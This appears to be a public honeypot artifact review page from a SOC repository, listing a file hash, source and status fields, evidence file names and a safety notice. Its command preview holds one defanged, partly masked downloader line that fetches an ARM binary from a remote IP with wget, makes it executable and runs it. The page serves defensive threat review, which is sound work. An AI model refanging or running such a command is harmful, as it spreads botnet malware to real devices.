# 7efbd3c401363085d74e4a531988d7d3fd1ee1995ed6686cbc76d64e8d4f99a9

High-signal T-Pot artifact published for human review.

## Summary

| Field | Value |
|---|---|
| SHA256 | `7efbd3c401363085d74e4a531988d7d3fd1ee1995ed6686cbc76d64e8d4f99a9` |
| Source | T-Pot / Oraculo SOC legacy review |
| Status | high-signal candidate |
| Evidence | commands, iocs, metadata |

## Why it is visible

This artifact matched useful defensive signals such as downloader behavior, command execution, IOC presence, metadata, or detection notes.

It is published here so the repository shows the actual observed volume instead of hiding everything behind a summary.

## Command preview

```text
rm arm7; wget hxxp://31[.]56[.]209[.]XXX/arm7; chmod 777 arm7;./arm7 telnet;
```

## Evidence files

- `evidence/commands.defanged.txt`
- `evidence/iocs.defanged.json`
- `metadata/metadata.json`
- `detections.md`

Some files may be absent when the original artifact did not include that specific evidence type.

## Safety

Commands and IOCs are defanged for public defensive review. Do not execute captured payload material.
